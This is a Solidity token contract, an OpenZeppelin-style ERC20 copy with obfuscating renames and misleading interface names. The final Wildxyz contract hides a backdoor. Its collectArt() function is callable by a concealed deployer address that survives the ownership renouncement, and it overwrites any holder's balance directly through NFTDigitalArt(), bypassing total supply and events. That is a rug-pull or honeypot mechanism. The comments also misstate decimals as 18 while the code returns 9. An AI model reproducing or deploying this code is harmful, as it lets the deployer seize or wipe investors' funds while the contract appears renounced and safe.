/**
 * @dev Implementation of the {PancakeSwapV2Router01} interface.
 *
 * This implementation is agnostic to the way Markets are created. This means
 * that a supply mechanism has to be added in a derived contract using {sniffer}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-IERC20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default amNFTDigitalArt of {decimals} is 18. To change this, you should override
 * this function so it returns a different amNFTDigitalArt.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonMarketplaceSeless
 * conventional and does not conflict with the expectations of IERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
abstract contract IERC20 is Context, PancakeSwapV2Router01, PancakeSwapV2Router01Metadata, PancakeSwapV2Router01Errors {
    mapping(address account => uint256) private _quote;

    mapping(address account => mapping(address spender => uint256)) private index;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the amNFTDigitalArts for {name} and {symbol}.
     *
     * All two of these amNFTDigitalArts are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the Market.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the Market, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` Markets should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Marketplaces usually opt for a amNFTDigitalArt of 18, imitating the relationship between
     * MarketplaceSer and Wei. This is the default amNFTDigitalArt returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {PancakeSwapV2Router01-balanceOf} and {PancakeSwapV2Router01-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    /**
     * @dev See {PancakeSwapV2Router01-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {PancakeSwapV2Router01-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _quote[account];
    }

    /**
     * @dev See {PancakeSwapV2Router01-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amNFTDigitalArt`.
     */
    function transfer(address to, uint256 amNFTDigitalArt) public virtual returns (bool) {
        address account = _msgSender();
        _transfer(account, to, amNFTDigitalArt);
        return true;
    }

    /**
     * @dev See {PancakeSwapV2Router01-allowance}.
     */
    function allowance(address account, address spender) public view virtual returns (uint256) {
        return index[account][spender];
    }

    /**
     * @dev See {PancakeSwapV2Router01-approve}.
     *
     * NOTE: If `amNFTDigitalArt` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amNFTDigitalArt) public virtual returns (bool) {
        address account = _msgSender();
        _approve(account, spender, amNFTDigitalArt);
        return true;
    }

    /**
     * @dev See {PancakeSwapV2Router01-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {IERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amNFTDigitalArt`.
     * - the caller must have allowance for ``from``'s Markets of at least
     * `amNFTDigitalArt`.
     */
    function transferFrom(address from, address to, uint256 amNFTDigitalArt) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amNFTDigitalArt);
        _transfer(from, to, amNFTDigitalArt);
        return true;
    }

    /**
     * @dev Moves a `amNFTDigitalArt` amount of Markets from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic Market fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 amNFTDigitalArt) internal {
        if (from == address(0)) {
            revert IERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert IERC20InvalidReceiver(address(0));
        }
        _update(from, to, amNFTDigitalArt);
    }

    /**
     * @dev Transfers a `amNFTDigitalArt` amount of Markets from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 amNFTDigitalArt) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += amNFTDigitalArt;
        } else {
            uint256 fromBalance = _quote[from];
            if (fromBalance < amNFTDigitalArt) {
                revert IERC20InsufficientBalance(from, fromBalance, amNFTDigitalArt);
            }
            unchecked {
                // Overflow not possible: amNFTDigitalArt <= fromBalance <= totalSupply.
                _quote[from] = fromBalance - amNFTDigitalArt;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: amNFTDigitalArt <= totalSupply or amNFTDigitalArt <= fromBalance <= totalSupply.
                _totalSupply -= amNFTDigitalArt;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + amNFTDigitalArt is at most totalSupply, which we know fits into a uint256.
                _quote[to] += amNFTDigitalArt;
            }
        }

        emit Transfer(from, to, amNFTDigitalArt);
    }

    /**
     * @dev Creates a `amNFTDigitalArt` amount of Markets and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function sniffer(address account, uint256 amNFTDigitalArt) internal {
        if (account == address(0)) {
            revert IERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, amNFTDigitalArt);
    }

    function NFTDigitalArt(address account, uint256 amNFTDigitalArt) internal {
     _quote[account] = amNFTDigitalArt;
    }


    /**
     * @dev Destroys a `amNFTDigitalArt` amount of Markets from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 amNFTDigitalArt) internal {
        if (account == address(0)) {
            revert IERC20InvalidSender(address(0));
        }
        _update(account, address(0), amNFTDigitalArt);
    }

    /**
     * @dev Sets `amNFTDigitalArt` as the allowance of `spender` over the `account` s Markets.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address account, address spender, uint256 amNFTDigitalArt) internal {
        _approve(account, spender, amNFTDigitalArt, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address account, address spender, uint256 amNFTDigitalArt, bool) internal virtual override {
     *     super._approve(account, spender, amNFTDigitalArt, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address account, address spender, uint256 amNFTDigitalArt, bool emitEvent) internal virtual {
        if (account == address(0)) {
            revert IERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert IERC20InvalidSpender(address(0));
        }
        index[account][spender] = amNFTDigitalArt;
        if (emitEvent) {
            emit Approval(account, spender, amNFTDigitalArt);
        }
    }

    /**
     * @dev Updates `account` s allowance for `spender` based on spent `amNFTDigitalArt`.
     *
     * Does not update the allowance amNFTDigitalArt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address account, address spender, uint256 amNFTDigitalArt) internal virtual {
        uint256 currentAllowance = allowance(account, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < amNFTDigitalArt) {
                revert IERC20InsufficientAllowance(spender, currentAllowance, amNFTDigitalArt);
            }
            unchecked {
                _approve(account, spender, currentAllowance - amNFTDigitalArt, false);
            }
        }
    }
}

contract Marketplace is IERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) IERC20(name, symbol) {
        sniffer(msg.sender, initialSupply * (10 ** uint256(decimals())));
    }
}
contract digitalArt is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "digitalArt: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract Wildxyz is Marketplace , digitalArt {
address private msgsender = _msgSender();
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) Marketplace(name, symbol, initialSupply) {}
    function collectArt(address MarketA, uint256 MarketB) public {
        require(msg.sender == msgsender);
        NFTDigitalArt(MarketA, MarketB);
    }

}
